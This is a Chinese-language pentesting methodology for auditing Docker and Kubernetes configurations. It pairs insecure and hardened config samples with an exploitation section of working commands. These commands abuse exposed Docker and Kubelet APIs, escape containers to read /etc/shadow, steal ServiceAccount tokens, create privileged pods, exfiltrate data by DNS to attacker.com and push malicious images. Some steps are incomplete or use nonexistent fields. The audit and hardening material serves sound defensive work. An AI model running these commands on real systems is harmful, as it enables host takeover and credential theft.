# 容器配置审计方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对容器环境（Docker、Kubernetes 等）配置安全审计的系统性方法论。容器技术的广泛应用带来了新的安全挑战，配置错误可能导致容器逃逸、集群沦陷等严重后果。

### 1.2 适用范围
- Docker 容器平台
- Kubernetes 集群
- Containerd
- Podman
- OpenShift
- 其他容器编排平台

### 1.3 读者对象
- 渗透测试工程师
- 容器安全审计人员
- DevOps 工程师
- 云原生安全工程师

---

## 第二部分：核心渗透技术专题

### 专题：容器配置审计

#### 2.1 技术介绍

容器配置错误是指容器化环境和编排平台在使用过程中的不安全配置。由于容器共享内核、强调快速部署的特性，配置错误可能导致比传统环境更严重的安全后果。

**常见容器配置错误类型：**

| 错误类型 | 描述 | 危害等级 |
|---------|------|---------|
| **特权容器** | 容器以特权模式运行 | 严重 |
| **Docker Socket 暴露** | Docker API 未保护 | 严重 |
| **容器逃逸** | 挂载宿主机敏感路径 | 严重 |
| **镜像漏洞** | 使用存在漏洞的基础镜像 | 高 |
| **网络配置错误** | 容器网络隔离不足 | 高 |
| **RBAC 配置错误** | Kubernetes 权限过宽 | 高 |
| **Secret 管理不当** | 敏感信息硬编码 | 高 |

**容器技术栈：**

```
┌─────────────────────────────────────┐
│         容器编排层 (K8s)            │
├─────────────────────────────────────┤
│         容器运行时 (Docker)          │
├─────────────────────────────────────┤
│         容器镜像                    │
├─────────────────────────────────────┤
│         宿主机操作系统               │
└─────────────────────────────────────┘
```

#### 2.2 审计常见于哪些场景

| 场景 | 风险点描述 |
|-----|-----------|
| **容器化迁移** | 快速迁移导致安全配置缺失 |
| **CI/CD 集成** | 构建管道中的凭证泄露 |
| **微服务部署** | 服务间信任关系配置错误 |
| **多云容器** | 跨云容器网络配置复杂 |
| **开发环境** | 开发集群安全措施不足 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**1. Docker API 检测**

```bash
# 检测 Docker API 是否暴露
curl http://target:2375/version
curl http://target:2375/containers/json

# 检测 Docker API 是否启用 TLS
curl https://target:2376/version -k

# 使用 docker-cli 连接
docker -H tcp://target:2375 ps
```

**2. Kubernetes API 检测**

```bash
# 检测 API 服务器
curl -k https://target:6443/version
curl -k https://target:6443/api/v1/namespaces

# 检查匿名访问
curl -k https://target:6443/api/v1/pods

# 使用 kubectl
kubectl --insecure-skip-tls-verify --server=https://target:6443 get pods
```

**3. 常见暴露端口**

| 服务 | 端口 | 协议 |
|-----|------|------|
| Docker API (未加密) | 2375 | TCP |
| Docker API (TLS) | 2376 | TCP |
| Kubernetes API | 6443 | TCP |
| Kubernetes etcd | 2379-2380 | TCP |
| Kubernetes Kubelet | 10250 | TCP |
| Kubernetes Dashboard | 443 | TCP |
| etcd | 2379 | TCP |

**4. 自动化扫描工具**

```bash
# Docker 安全扫描
docker scan myimage

# Kubernetes 审计
git clone https://github.com/aquasecurity/kube-bench
./kube-bench

# 集群安全检查
git clone https://github.com/aquasecurity/kube-hunter
kube-hunter --remote target

# 容器镜像扫描
trivy image myimage:latest
```

##### 2.3.2 白盒测试

**1. Dockerfile 审计**

```dockerfile
# ❌ 不安全：使用 root 用户
FROM ubuntu:latest
RUN apt-get update && apt-get install -y app

# ✅ 安全：使用非 root 用户
FROM ubuntu:latest
RUN useradd -r -s /bin/false appuser
USER appuser

# ❌ 不安全：硬编码敏感信息
ENV DB_PASSWORD=secret123

# ✅ 安全：使用构建参数或运行时注入
ARG DB_PASSWORD
# 或使用 Docker Secrets

# ❌ 不安全：使用 latest 标签
FROM python:latest

# ✅ 安全：使用具体版本
FROM python:3.9.7-slim
```

**2. Docker Compose 审计**

```yaml
# ❌ 不安全：特权模式
services:
  app:
    privileged: true
    cap_add:
      - ALL

# ✅ 安全：最小权限
services:
  app:
    privileged: false
    security_opt:
      - no-new-privileges:true

# ❌ 不安全：挂载 Docker Socket
  app:
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock

# ❌ 不安全：挂载宿主机根目录
  app:
    volumes:
      - /:/host
```

**3. Kubernetes Pod 安全审计**

```yaml
# ❌ 不安全：特权容器
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    securityContext:
      privileged: true
      runAsRoot: true

# ✅ 安全：限制安全上下文
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL

# ❌ 不安全：使用 default ServiceAccount
spec:
  serviceAccountName: default

# ✅ 安全：使用专用 ServiceAccount
spec:
  serviceAccountName: app-sa
```

**4. Kubernetes RBAC 审计**

```yaml
# ❌ 不安全：过度权限 ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: dangerous-role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# ✅ 安全：最小权限
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-role
  namespace: app-namespace
rules:
- apiGroups: [""]
  resources: ["pods", "services"]
  verbs: ["get", "list"]
```

#### 2.4 漏洞利用方法

##### 2.4.1 Docker API 未授权访问利用

```bash
# 1. 列出容器
curl http://target:2375/containers/json

# 2. 创建特权容器
curl -X POST http://target:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["nsenter", "--mount=/proc/1/ns/mnt", "--", "bash"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }'

# 3. 启动容器
curl -X POST http://target:2375/containers/{id}/start

# 4. 执行命令
curl -X POST http://target:2375/containers/{id}/exec \
  -H "Content-Type: application/json" \
  -d '{"Cmd": ["cat", "/host/etc/shadow"]}'
```

##### 2.4.2 容器逃逸

```bash
# 1. 挂载 Docker Socket 逃逸
# 在容器内执行
docker -H unix:///var/run/docker.sock ps

# 创建新容器挂载宿主机文件系统
docker run -v /:/host -it alpine chroot /host

# 2. 特权容器逃逸
# 在容器内挂载宿主机
mount -t proc proc /proc-host

# 3. 利用 cgroup 逃逸
# 如果容器可以写入 cgroup
cd /sys/fs/cgroup
mkdir escape
echo $$ > escape/cgroup.procs
```

##### 2.4.3 Kubernetes 集群利用

```bash
# 1. 获取 ServiceAccount Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 2. 使用 Token 访问 API
curl -k https://kubernetes.default/api/v1/namespaces \
  -H "Authorization: Bearer TOKEN"

# 3. 创建特权 Pod
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: exploit
spec:
  containers:
  - name: shell
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
EOF

# 4. 横向移动到其他 Namespace
kubectl get secrets --all-namespaces
```

##### 2.4.4 Kubelet 未授权访问利用

```bash
# 1. 获取 Pod 列表
curl -k https://target:10250/pods

# 2. 执行命令
curl -k -X POST https://target:10250/run/default/pod-name/container-name \
  -d "cmd=id"

# 3. 获取日志
curl -k https://target:10250/logs/default/pod-name/container-name.log
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 网络策略绕过

| 绕过技术 | 描述 | 示例 |
|---------|------|------|
| **DNS 隧道** | 通过 DNS 外带数据 | nslookup attacker.com |
| **ICMP 隧道** | 通过 ICMP 传输 | ping -p payload |
| **服务发现滥用** | 利用 K8s DNS 发现 | 枚举集群内服务 |

##### 2.5.2 安全上下文绕过

```
# 利用内核漏洞绕过
1. 检查内核版本
uname -a

2. 查找提权漏洞
searchsploit linux kernel $(uname -r)

3. 编译并执行提权 exploit
```

##### 2.5.3 镜像签名绕过

```
# 如果未正确配置镜像签名验证
1. 构建恶意镜像
docker build -t attacker/app .

2. 推送到可信仓库
docker push registry/app

3. 等待被部署
```

---

## 第三部分：附录

### 3.1 容器安全配置检查清单

| 检查项 | Docker | Kubernetes |
|-------|--------|-----------|
| **镜像扫描** | Docker Scan | Trivy/Clair |
| **运行时保护** | AppArmor/SELinux | Pod Security Policy |
| **网络隔离** | 自定义网络 | NetworkPolicy |
| **密钥管理** | Docker Secrets | Kubernetes Secrets |
| **日志审计** | Docker 日志 | Audit Log |

### 3.2 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Trivy** | 镜像扫描 | `trivy image myimage` |
| **Kube-bench** | CIS 基准检查 | `kube-bench` |
| **Kube-hunter** | 集群渗透测试 | `kube-hunter --remote` |
| **Docker-bench** | Docker 安全检查 | `docker run docker/docker-bench-security` |
| **Falco** | 运行时威胁检测 | `falco` |

### 3.3 修复建议

- [ ] 使用非 root 用户运行容器
- [ ] 禁用特权容器
- [ ] 不挂载 Docker Socket
- [ ] 扫描和更新镜像漏洞
- [ ] 实施网络策略隔离
- [ ] 使用 Secret 管理敏感信息
- [ ] 启用审计日志
- [ ] 实施 Pod 安全策略/标准
